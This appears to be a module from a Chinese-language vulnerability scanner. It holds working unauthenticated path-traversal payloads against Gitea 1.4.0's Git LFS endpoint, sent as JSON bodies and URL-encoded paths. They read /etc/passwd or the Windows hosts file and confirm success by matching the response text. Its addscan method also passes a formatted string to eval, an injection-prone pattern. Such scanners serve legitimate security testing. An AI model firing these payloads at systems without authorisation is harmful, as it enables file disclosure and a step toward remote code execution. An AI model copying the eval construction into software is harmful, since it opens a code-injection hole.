#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Gitea是从gogs衍生出的一个开源项目, 是一个类似于Github、Gitlab的多用户Git仓库管理平台
    Gitea扫描类: 
        Gitea 1.4.0 未授权访问, 综合漏洞(目录穿越, RCE等)
            暂无编号
                Payload: https://vulhub.org/#/environments/gitea/1.4-rce/


file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
from time import sleep
import re

class Gitea():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Gitea'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.gitea_unauthorized_payloads = [
            {
                'path': '.git/info/lfs/objects',
                'data': '''{
    "Oid": "....../../../etc/passwd",
    "Size": 1000000,
    "User" : "a",
    "Password" : "a",
    "Repo" : "a",
    "Authorization" : "a"
}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'Accept': 'application/vnd.git-lfs+json'
                })
            },
            {
                'path': '.git/info/lfs/objects/%2e%2e%2e%2e%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2Fpasswd/a',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
            {
                'path': '.git/info/lfs/objects',
                'data': '''{
    "Oid": "....../../../C:/Windows/System32/drivers/etc/hosts",
    "Size": 1000000,
    "User" : "a",
    "Password" : "a",
    "Repo" : "a",
    "Authorization" : "a"
}''',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'application/json',
                    'Accept': 'application/vnd.git-lfs+json'
                })
            },
            {
                'path': '.git/info/lfs/objects/%2e%2e%2e%2e%2e%2e%2F%2e%2e%2F%2e%2e%2FC:%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fhosts/a',
                'data': '',
                'headers': head.merge(self.headers, {})
            },
        ]

    def gitea_unauthorized_scan(self, url):
        ''' 其1.4.0版本中有一处逻辑错误, 导致未授权用户可以穿越目录, 读写任意文件, 最终导致执行任意命令 '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'unAuthorized'
        vul_info['vul_id'] = 'Gitea-unAuthorized'
        vul_info['vul_method'] = 'POST/GET'

        for payload in range(len(self.gitea_unauthorized_payloads)):
            path = self.gitea_unauthorized_payloads[payload]['path']
            data = self.gitea_unauthorized_payloads[payload]['data']
            headers = self.gitea_unauthorized_payloads[payload]['headers']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                if (payload in [0, 2]):
                    res1 = requests.post(
                        target, 
                        timeout=self.timeout, 
                        headers=headers,
                        data=data, 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                    logger.logging(vul_info, res1.status_code, res1)                        # * LOG
                    
                    if (res1.status_code in [202, 401]):
                        path = self.gitea_unauthorized_payloads[payload+1]['path']
                        headers = self.gitea_unauthorized_payloads[payload+1]['headers']
                        target = url + path

                        res2 = requests.get(
                            target, 
                            timeout=self.timeout, 
                            headers=headers,
                            proxies=self.proxies, 
                            verify=False,
                            allow_redirects=False
                        )
                        logger.logging(vul_info, res2.status_code, res2)                        # * LOG

                        if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res2.text, re.I|re.M|re.S)
                            or (('Microsoft Corp' in res2.text) 
                                and ('Microsoft TCP/IP for Windows' in res2.text))
                        ):
                            results = {
                                'Target': target,
                                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                                'Request-1': res1,
                                'Request-2': res2
                            }
                            return results
                else:
                    continue

            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None


    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.gitea_unauthorized_scan, url=url)
        ]

gitea = Gitea()
